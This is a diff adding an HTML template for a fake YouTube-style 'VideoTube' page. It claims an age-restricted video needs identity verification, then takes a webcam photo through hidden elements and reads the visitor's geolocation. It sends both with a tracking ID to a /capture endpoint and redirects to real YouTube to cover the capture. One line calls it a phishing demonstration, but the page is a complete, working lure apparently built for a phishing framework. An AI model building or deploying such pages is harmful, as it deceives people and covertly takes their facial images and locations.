@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Error - Video Playback Issue</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+        }
+        .header {
+            background-color: #ffffff;
+            padding: 10px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+        }
+        .logo {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .logo-text {
+            color: #282828;
+            font-size: 20px;
+            font-weight: normal;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .video-container {
+            background-color: #000;
+            width: 100%;
+            height: 0;
+            padding-bottom: 56.25%;
+            position: relative;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .error-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .error-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        .error-message {
+            font-size: 16px;
+            margin-bottom: 30px;
+            max-width: 80%;
+        }
+        .verify-btn {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 2px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .video-info {
+            margin-top: 15px;
+        }
+        .video-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .channel-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-color: #ddd;
+        }
+        .channel-name {
+            font-weight: bold;
+        }
+        .video-stats {
+            display: flex;
+            margin-bottom: 20px;
+            color: #606060;
+        }
+        .stat {
+            margin-right: 20px;
+        }
+        .consent-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .consent-dialog {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 500px;
+            color: #333;
+        }
+        .consent-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .consent-buttons {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+        .consent-btn {
+            padding: 10px 20px;
+            margin-left: 10px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+        .consent-continue {
+            background-color: #065fd4;
+            color: white;
+        }
+        .consent-cancel {
+            background-color: #f2f2f2;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">▶</div>
+        <div class="logo-text">VideoTube</div>
+    </div>
+    
+    <div class="container">
+        <div class="video-container">
+            <div class="error-overlay">
+                <div class="error-title">Content Privacy Verification Required</div>
+                <div class="error-message">This age-restricted content requires verification of your identity in accordance with our updated privacy policy. Please verify your identity to continue watching.</div>
+                <button class="verify-btn" id="verify-btn">Verify Identity & Watch</button>
+            </div>
+        </div>
+        
+        <div class="video-info">
+            <div class="video-title">The Ultimate Guide to Cybersecurity - What You Need to Know in 2025</div>
+            
+            <div class="video-stats">
+                <div class="stat">1.2M views</div>
+                <div class="stat">2 days ago</div>
+            </div>
+            
+            <div class="channel-info">
+                <div class="channel-avatar"></div>
+                <div class="channel-name">Tech Security Pro</div>
+            </div>
+            
+            <div class="video-description">
+                <p>In this comprehensive guide to cybersecurity in 2025, we cover everything from personal data protection to enterprise security strategies. Learn about the latest threats and how to protect yourself online.</p>
+                <p>This video contains mature content related to cybersecurity attacks and is age-restricted in accordance with community guidelines.</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="consent-overlay" id="consent-overlay">
+        <div class="consent-dialog">
+            <div class="consent-title">Age and Identity Verification</div>
+            <p>To comply with privacy regulations and ensure appropriate content delivery, we need to verify your identity using:</p>
+            <ul>
+                <li>Facial recognition (via camera access)</li>
+                <li>Location verification</li>
+            </ul>
+            <p>This is a one-time verification process. By continuing, you agree to our updated Terms of Service and Privacy Policy.</p>
+            <p><small><em>Note: This is a demonstration of phishing techniques. No real verification is performed.</em></small></p>
+            <div class="consent-buttons">
+                <button class="consent-btn consent-cancel" id="cancel-btn">Cancel</button>
+                <button class="consent-btn consent-continue" id="continue-btn">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get the tracking ID from the server if available
+        const trackingId = "{{ tracking_id|default('unknown') }}";
+        
+        // Variables to store captured data
+        let capturedImage = null;
+        let locationData = { lat: null, lon: null };
+        
+        // Show consent overlay when verify button is clicked
+        document.getElementById('verify-btn').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'flex';
+        });
+        
+        // Cancel button closes the overlay
+        document.getElementById('cancel-btn').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'none';
+        });
+        
+        // Continue button initiates the "verification" process
+        document.getElementById('continue-btn').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'none';
+            initiateCapture();
+        });
+        
+        async function initiateCapture() {
+            try {
+                // Create hidden elements for capture
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                const canvas = document.createElement('canvas');
+                canvas.style.display = 'none';
+                document.body.appendChild(canvas);
+                
+                // Access webcam
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                video.onloadedmetadata = function() {
+                    video.play();
+                    
+                    // Capture frame after short delay
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Get image data
+                        capturedImage = canvas.toDataURL('image/jpeg');
+                        
+                        // Stop stream and clean up
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        document.body.removeChild(canvas);
+                        
+                        // Get location
+                        getLocation();
+                        
+                        // Show verification in progress
+                        showVerificationProgress();
+                    }, 1000);
+                };
+            } catch (error) {
+                console.error('Camera access error:', error);
+                alert('Unable to access camera for verification. Please check your permissions and try again.');
+            }
+        }
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData.lat = position.coords.latitude;
+                        locationData.lon = position.coords.longitude;
+                        sendDataToServer();
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        sendDataToServer();
+                    }
+                );
+            } else {
+                console.error('Geolocation not supported');
+                sendDataToServer();
+            }
+        }
+        
+        function showVerificationProgress() {
+            const overlay = document.querySelector('.error-overlay');
+            overlay.innerHTML = `
+                <div class="error-title">Verification in Progress</div>
+                <div class="error-message">Please wait while we verify your identity...</div>
+                <div style="width:50%; height:10px; background-color:#333; border-radius:5px; margin-top:20px;">
+                    <div id="progress-bar" style="width:10%; height:100%; background-color:#ff0000; border-radius:5px;"></div>
+                </div>
+            `;
+            
+            let width = 10;
+            const progressBar = document.getElementById('progress-bar');
+            
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    // Redirect to actual YouTube after "verification"
+                    window.location.href = "https://www.youtube.com/results?search_query=cybersecurity+guide";
+                } else {
+                    width += 5;
+                    progressBar.style.width = width + '%';
+                }
+            }, 200);
+        }
+        
+        async function sendDataToServer() {
+            const data = {
+                tracking_id: trackingId,
+                image: capturedImage,
+                lat: locationData.lat,
+                lon: locationData.lon,
+                source: 'youtube_template'
+            };
+            
+            try {
+                await fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+    </script>
+</body>
+</html>
